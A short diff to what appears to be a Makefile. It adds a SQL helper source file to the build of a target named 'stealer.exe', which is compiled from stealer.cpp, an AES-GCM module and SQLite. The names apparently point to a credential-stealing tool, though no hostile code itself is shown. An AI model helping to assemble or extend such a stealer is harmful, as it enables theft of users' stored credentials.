@@ -13,7 +13,7 @@ all: stealer
 
 # run sqlite3 before 
 stealer:
-	$(CXX)  stealer.cpp aes_gcm.cpp sqlite3.o $(LDFLAGS) -o stealer.exe 
+	$(CXX)  stealer.cpp aes_gcm.cpp SQLfunctions.cpp sqlite3.o $(LDFLAGS) -o stealer.exe 
 file:
 	$(CC)  filestuff.c   sqlite3.o $(LDFLAGS) -o f.exe 
 sqtest:
